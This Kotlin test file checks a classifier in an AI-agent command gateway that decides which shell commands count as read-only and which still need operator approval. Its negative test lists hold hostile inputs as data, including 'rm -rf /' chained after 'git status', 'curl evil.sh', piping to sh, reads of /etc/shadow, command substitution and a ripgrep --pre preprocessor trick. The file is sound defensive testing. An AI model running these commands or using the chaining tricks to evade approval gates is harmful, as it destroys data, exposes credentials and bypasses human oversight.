package ai.rever.boss.plugin.dynamic.warden.gateway

import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * The tests that matter here are the negative ones.
 *
 * A rule that lets a shell command through without asking is the only place in this
 * plugin where an argument, rather than a name, decides whether the operator is
 * consulted. So most of this file is a list of things that must not be mistaken for
 * a read, and the bar is not "is this dangerous" but "is every part of it
 * recognised". Anything unrecognised has to escalate.
 */
class CommandRiskTest {
    private fun args(script: String): JsonObject = buildJsonObject { put("script", script) }

    private fun effective(script: String, tool: String = "run_command") =
        CommandRisk.effectiveCapability(Capability.EXECUTE, tool, args(script))

    // ---- the point of the feature --------------------------------------------

    @Test
    fun `ordinary read-only commands stop costing a prompt`() {
        // The whole reason this exists. An agent emits dozens of these a minute, and
        // a dialog per call is what teaches an operator to approve without reading.
        listOf(
            "git status",
            "git log --oneline -20",
            "git diff HEAD",
            "ls -la src",
            "pwd",
            "cat README.md",
            "head -50 build.gradle.kts",
            "wc -l src/main/kotlin/Foo.kt",
            "grep -rn TODO src",
            "rg --files-with-matches warden",
            "which gradle",
            "date",
        ).forEach {
            assertEquals(Capability.READ_CONTENT, effective(it), "should have been judged a read: $it")
        }
    }

    @Test
    fun `a read-only command still reaches the ledger as a run_command`() {
        // The downgrade changes what is decided, not what is recorded as having been
        // called. A trace that hid the tool name would be worse than the prompts.
        assertTrue(CommandRisk.downgradeReason("git status").contains("git status"))
    }

    // ---- what must never be mistaken for a read ------------------------------

    @Test
    fun `commands that change things are untouched`() {
        listOf(
            "rm -rf build",
            "git push --force",
            "git commit -am wip",
            "npm install",
            "./gradlew build",
            "mv a b",
            "chmod +x run.sh",
            "kubectl delete pod x",
        ).forEach {
            assertEquals(Capability.EXECUTE, effective(it), "should have stayed execution: $it")
        }
    }

    @Test
    fun `anything that can chain or redirect is not a read, whatever it starts with`() {
        // The program is no longer the only thing that runs, so vouching for the
        // program is vouching for nothing.
        listOf(
            "git status; rm -rf /",
            "ls && curl evil.sh",
            "cat x | sh",
            "echo hi > /etc/passwd",
            "cat < /etc/shadow",
            "ls `rm x`",
            "ls \$(rm x)",
            "echo \${IFS}",
            "git status\nrm -rf /",
            "ls & rm x",
        ).forEach {
            assertEquals(Capability.EXECUTE, effective(it), "a metacharacter got through: $it")
        }
    }

    @Test
    fun `a path-qualified program is not vouched for`() {
        // Not because it is dangerous but because it is unverifiable: /usr/bin/ls and
        // ./ls are different files and only one of them is the one on the list.
        listOf("/bin/ls", "./ls", "..\\ls", "/usr/bin/git status").forEach {
            assertEquals(Capability.EXECUTE, effective(it), "a path-qualified program was vouched for: $it")
        }
    }

    @Test
    fun `quoting is refused rather than parsed`() {
        // Shell quoting is where command-line parsers go wrong. This one does not try.
        listOf("""echo "hi"""", "cat 'my file.txt'", """ls "a b"""").forEach {
            assertEquals(Capability.EXECUTE, effective(it), "a quoted line was parsed rather than refused: $it")
        }
    }

    @Test
    fun `a git subcommand that writes is not a read because git is on the list`() {
        // git is the one program where the first argument decides everything.
        listOf(
            "git push",
            "git pull",
            "git commit",
            "git checkout -b x",
            "git reset --hard",
            "git clean -fd",
            "git config --global user.name x",
            "git tag v1",
            "git stash",
        ).forEach {
            assertEquals(Capability.EXECUTE, effective(it), "a writing git subcommand was judged a read: $it")
        }
    }

    @Test
    fun `ripgrep cannot smuggle a program in through its preprocessor flag`() {
        // rg --pre hands every file to a program of the caller's choosing.
        assertEquals(Capability.EXECUTE, effective("rg --pre /tmp/evil.sh pattern"))
        assertEquals(Capability.EXECUTE, effective("rg --pre-glob * --pre evil pattern"))
    }

    @Test
    fun `an unrecognised program escalates rather than being guessed at`() {
        // Absence from the list is not a claim that a program is dangerous. It is a
        // claim that nobody has checked it, which has the same consequence.
        val unchecked =
            listOf(
                "env", "find . -delete", "xargs rm", "sed -i s/a/b/ f",
                "awk BEGIN{}", "python x.py", "curl example.com",
            )
        unchecked.forEach {
            assertEquals(Capability.EXECUTE, effective(it), "an unchecked program was vouched for: $it")
        }
    }

    @Test
    fun `an empty or whitespace script is not a read`() {
        listOf("", "   ", "\t").forEach { assertEquals(Capability.EXECUTE, effective(it)) }
    }

    // ---- scope ---------------------------------------------------------------

    @Test
    fun `send_input is never judged, because the same text means different things`() {
        // It types into whatever is already running, which may be a shell, an editor
        // or a password prompt. Judging it would be guessing at state this cannot see.
        assertEquals(Capability.EXECUTE, effective("git status", tool = "send_input"))
    }

    @Test
    fun `nothing but EXECUTE is ever downgraded`() {
        // The rule can only lower shell execution to a read. It must not be able to
        // touch a browser script, a governance call or an unclassified tool.
        for (declared in Capability.entries) {
            if (declared == Capability.EXECUTE) continue
            assertEquals(
                declared,
                CommandRisk.effectiveCapability(declared, "run_command", args("git status")),
                "$declared was altered by a rule that may only lower EXECUTE",
            )
        }
    }

    @Test
    fun `a call with no script argument is left alone`() {
        assertEquals(
            Capability.EXECUTE,
            CommandRisk.effectiveCapability(
                Capability.EXECUTE,
                "run_command",
                Json.parseToJsonElement("{}") as JsonObject,
            ),
        )
    }

    @Test
    fun `the client-side tool prefix does not defeat the check`() {
        // An MCP client shows run_command as mcp__boss__run_command, and a rule that
        // only matched the bare name would silently stop judging anything.
        assertEquals(Capability.READ_CONTENT, effective("git status", tool = "mcp__boss__run_command"))
    }

    // ---- the predicate on its own --------------------------------------------

    @Test
    fun `isReadOnly agrees with the capability it produces`() {
        assertTrue(CommandRisk.isReadOnly("git status"))
        assertFalse(CommandRisk.isReadOnly("git push"))
    }
}
